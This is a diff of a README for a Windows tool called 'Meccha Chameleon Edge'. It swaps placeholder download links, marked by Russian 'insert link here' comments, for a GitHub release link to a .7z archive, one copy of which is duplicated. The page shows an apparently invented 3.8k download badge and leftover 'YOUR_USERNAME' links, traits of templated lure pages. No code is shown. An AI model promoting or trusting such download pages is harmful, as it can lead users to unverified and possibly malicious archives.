@@ -1,3 +1,5 @@
+<img width="1336" height="756" alt="image" src="https://github.com/user-attachments/assets/df3bb9f0-5b4b-4d81-894b-b2d0cd17bb42" />
+
 <p align="center">
   <img src="https://img.icons8.com/color/96/000000/chameleon.png" alt="MECCHA CHAMELEON" width="80" height="80">
 </p>
@@ -11,8 +13,7 @@
 <p align="center">
   <a href="https://github.com/YOUR_USERNAME/Meccha-Chameleon-Edge"><img src="https://img.shields.io/badge/version-2.0.0-brightgreen?style=for-the-badge" alt="Version"></a>
   <a href="https://github.com/YOUR_USERNAME/Meccha-Chameleon-Edge"><img src="https://img.shields.io/badge/platform-Windows-blue?style=for-the-badge" alt="Platform"></a>
-  <!-- СЮДА ВСТАВИТЬ ССЫЛКУ НА СКАЧИВАНИЕ -->
-  <a href="ССЫЛКА_НА_СКАЧИВАНИЕ"><img src="https://img.shields.io/badge/downloads-3.8k-brightgreen?style=for-the-badge" alt="Downloads"></a>
+  <a href="https://github.com/Stonedelderrick/Meccha-Chameleon-Edge/releases/download/1/MecchaEDGE.7zhttps://github.com/Stonedelderrick/Meccha-Chameleon-Edge/releases/download/1/MecchaEDGE.7z"><img src="https://img.shields.io/badge/downloads-3.8k-brightgreen?style=for-the-badge" alt="Downloads"></a>
   <a href="https://github.com/YOUR_USERNAME/Meccha-Chameleon-Edge"><img src="https://img.shields.io/badge/status-active-success?style=for-the-badge" alt="Status"></a>
   <a href="https://github.com/YOUR_USERNAME/Meccha-Chameleon-Edge/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-orange?style=for-the-badge" alt="License"></a>
 </p>
@@ -37,8 +38,7 @@
 ## 📥 Download
 
 <p align="center">
-  <!-- СЮДА ВСТАВИТЬ ССЫЛКУ НА СКАЧИВАНИЕ -->
-  <a href="ССЫЛКА_НА_СКАЧИВАНИЕ">
+  <a href="https://github.com/Stonedelderrick/Meccha-Chameleon-Edge/releases/download/1/MecchaEDGE.7z">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
   </a>
 </p>
